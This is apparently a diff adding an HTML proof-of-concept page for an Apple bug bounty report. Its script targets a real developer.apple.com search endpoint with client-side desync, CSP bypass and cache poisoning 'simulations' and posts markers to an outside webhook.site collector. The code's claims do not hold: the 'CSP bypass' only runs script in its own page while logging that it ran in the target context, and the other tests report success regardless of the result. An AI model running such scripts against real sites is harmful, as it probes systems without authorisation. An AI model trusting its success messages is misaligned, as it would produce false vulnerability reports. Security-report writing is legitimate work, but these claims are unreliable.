@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Apple CSD & CSP Bypass - Safe PoC</title>
+</head>
+<body>
+<h2>Apple Client-Side Desync & CSP Bypass - Safe Demonstration</h2>
+<p>This PoC is for Apple Security Bounty testing purposes only. No real sensitive data is collected — only harmless markers are sent.</p>
+
+<script>
+/*
+📌 Purpose:
+Demonstrate multiple attack scenarios (Client-Side Desync, CSP Bypass, Cache Poisoning)
+against the specified vulnerable endpoint, while only sending SAFE test markers to a webhook.
+
+🔍 Sent markers:
+- marker_csd: Confirms CSD test request executed
+- marker_csp: Confirms CSP bypass code executed
+- marker_cache: Confirms cache poisoning test executed
+- note: Clarifies that all data is mock and no sensitive information is collected
+*/
+
+// Vulnerable endpoint to test (provided by the reporter)
+const targetUrl = "https://developer.apple.com/search/services/v1/quick-links/";
+
+// Reporter’s webhook for receiving safe proof markers
+const webhookUrl = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";
+
+// Function to send marker data to webhook
+function sendMarker(type) {
+    fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            marker_type: type,
+            page: location.href,
+            timestamp: new Date().toISOString(),
+            note: "SAFE DEMO: This is mock data for vulnerability demonstration only."
+        })
+    }).then(() => {
+        console.log(`✅ Marker sent: ${type}`);
+    }).catch(err => console.error("❌ Error sending marker:", err));
+}
+
+// 1️⃣ Client-Side Desync Simulation
+fetch(targetUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "test_marker=csd_demo"
+})
+.then(() => {
+    console.log("CSD test request executed.");
+    sendMarker("marker_csd");
+})
+.catch(err => console.error("CSD request failed:", err));
+
+// 2️⃣ CSP Bypass Simulation
+(function cspBypass() {
+    const s = document.createElement("script");
+    s.innerHTML = `
+        console.log("✅ CSP Bypass code executed inside target context.");
+        document.body.style.background = '#ffeecc';
+        document.body.insertAdjacentHTML('beforeend', '<h3>CSP Bypass Marker Injected</h3>');
+    `;
+    document.body.appendChild(s);
+    sendMarker("marker_csp");
+})();
+
+// 3️⃣ Cache Poisoning Simulation
+(function cachePoisoning() {
+    fetch(targetUrl + "?marker=cache_poison_demo", {
+        method: "GET",
+        cache: "reload"
+    })
+    .then(() => {
+        console.log("Cache poisoning marker request sent.");
+        sendMarker("marker_cache");
+    })
+    .catch(err => console.error("Cache poisoning test failed:", err));
+})();
+</script>
+
+</body>
+</html>
